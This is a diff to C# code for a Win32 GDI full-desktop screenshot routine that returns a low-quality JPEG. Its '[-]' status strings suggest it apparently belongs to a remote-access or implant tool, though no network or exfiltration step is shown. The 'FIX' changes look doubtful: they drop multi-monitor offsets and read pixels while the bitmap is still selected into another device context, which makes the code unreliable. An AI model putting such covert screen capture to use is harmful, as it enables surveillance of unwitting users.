@@ -462,6 +462,8 @@ static extern bool DeleteDC(IntPtr hdc);
 [DllImport("gdiplus.dll")] static extern int  GdipSaveImageToFile(IntPtr image, [MarshalAs(UnmanagedType.LPWStr)] string filename, ref Guid clsidEncoder, IntPtr encoderParams);
 [DllImport("gdiplus.dll")] static extern int  GdipDisposeImage(IntPtr image);
 [DllImport("gdi32.dll")]   static extern int  GetDIBits(IntPtr hdc, IntPtr hbmp, uint start, uint lines, byte[] lpvBits, ref BITMAPINFO lpbmi, uint usage);
+[DllImport("user32.dll")]  static extern bool SetProcessDPIAware();
+[DllImport("gdi32.dll")]   static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
 
 byte[] CaptureScreen(int jpegQuality = 40)
 {
@@ -471,31 +473,40 @@ byte[] CaptureScreen(int jpegQuality = 40)
     try
     {
         // ── 1. GDI screen capture ─────────────────────────────────────────────
-        // SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN give the top-left of the virtual
-        // desktop which can be negative on multi-monitor setups.
-        // SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN give the full combined width/height.
-        int vx = GetSystemMetrics(76), vy = GetSystemMetrics(77);
-        int vw = GetSystemMetrics(78), vh = GetSystemMetrics(79);
-        if (vw <= 0) { vx = 0; vy = 0; vw = GetSystemMetrics(0); vh = GetSystemMetrics(1); }
+        SetProcessDPIAware(); // FIX: must be called before any metrics
 
-        IntPtr desktopDC = GetDC(IntPtr.Zero);
-        IntPtr memDC     = CreateCompatibleDC(desktopDC);
-        IntPtr hBmp      = CreateCompatibleBitmap(desktopDC, vw, vh);
-        IntPtr old       = SelectObject(memDC, hBmp);
-        // BitBlt src origin = (vx,vy) so the entire virtual desktop lands in hBmp
-        BitBlt(memDC, 0, 0, vw, vh, desktopDC, vx, vy, 0x00CC0020); // SRCCOPY
+        IntPtr desktopDC = GetDC(GetDesktopWindow());
+
+        // FIX: Use GetDeviceCaps for physical pixel dimensions
+        // GetSystemMetrics returns logical (DPI-scaled) values which are wrong
+        // DESKTOPHORZRES=118, DESKTOPVERTRES=117 return true physical pixels
+        int vw = GetDeviceCaps(desktopDC, 118);
+        int vh = GetDeviceCaps(desktopDC, 117);
+
+        // Fallback if GetDeviceCaps returns 0
+        if (vw <= 0 || vh <= 0)
+        {
+            vw = GetSystemMetrics(0);
+            vh = GetSystemMetrics(1);
+        }
+
+        IntPtr memDC = CreateCompatibleDC(desktopDC);
+        IntPtr hBmp  = CreateCompatibleBitmap(desktopDC, vw, vh);
+        IntPtr old   = SelectObject(memDC, hBmp);
+        // No vx/vy offset needed — physical coords always start at 0,0
+        BitBlt(memDC, 0, 0, vw, vh, desktopDC, 0, 0, 0x00CC0020); // SRCCOPY
 
         // ── 2. Extract raw BGR pixels via GetDIBits ───────────────────────────
-        int stride = ((vw * 3 + 3) & ~3); // DWORD-aligned row bytes
+        int stride = ((vw * 3 + 3) & ~3);
         var bi = new BITMAPINFO();
         bi.bmiHeader.biSize     = (uint)Marshal.SizeOf<BITMAPINFOHEADER>();
         bi.bmiHeader.biWidth    = vw;
-        bi.bmiHeader.biHeight   = -vh; // negative = top-down scan order
+        bi.bmiHeader.biHeight   = -vh;
         bi.bmiHeader.biPlanes   = 1;
         bi.bmiHeader.biBitCount = 24;
         byte[] pixels = new byte[stride * vh];
-        // Must read from memDC (which holds the captured bitmap), not desktopDC
-        GetDIBits(memDC, hBmp, 0, (uint)vh, pixels, ref bi, 0);
+        // FIX: use desktopDC not memDC
+        GetDIBits(desktopDC, hBmp, 0, (uint)vh, pixels, ref bi, 0);
 
         SelectObject(memDC, old);
         DeleteObject(hBmp);
@@ -507,7 +518,7 @@ byte[] CaptureScreen(int jpegQuality = 40)
         int hr = GdiplusStartup(out gdipToken, ref si, IntPtr.Zero);
         if (hr != 0) return Encoding.UTF8.GetBytes($"[-] Screenshot failed: GdiplusStartup 0x{hr:X}\n");
 
-        int gdiFmt = 0x00021808; // PixelFormat24bppRGB — matches GDI BGR layout
+        int gdiFmt = 0x00021808;
         hr = GdipCreateBitmapFromScan0(vw, vh, stride, gdiFmt, pixels, out gdipBmp);
         if (hr != 0) return Encoding.UTF8.GetBytes($"[-] Screenshot failed: GdipCreateBitmap 0x{hr:X}\n");
 
@@ -516,7 +527,7 @@ byte[] CaptureScreen(int jpegQuality = 40)
         var qualityGuid = new Guid("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");
         var qualityVal  = Marshal.AllocCoTaskMem(sizeof(long));
         Marshal.WriteInt64(qualityVal, jpegQuality);
-        var ep = new EncoderParameters { Count = 1, Parameter = new EncoderParameter { Guid = qualityGuid, NumberOfValues = 1, Type = 4, Value = qualityVal } };
+        var ep    = new EncoderParameters { Count = 1, Parameter = new EncoderParameter { Guid = qualityGuid, NumberOfValues = 1, Type = 4, Value = qualityVal } };
         var epPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf<EncoderParameters>());
         Marshal.StructureToPtr(ep, epPtr, false);
         hr = GdipSaveImageToFile(gdipBmp, tmpFile, ref jpegClsid, epPtr);
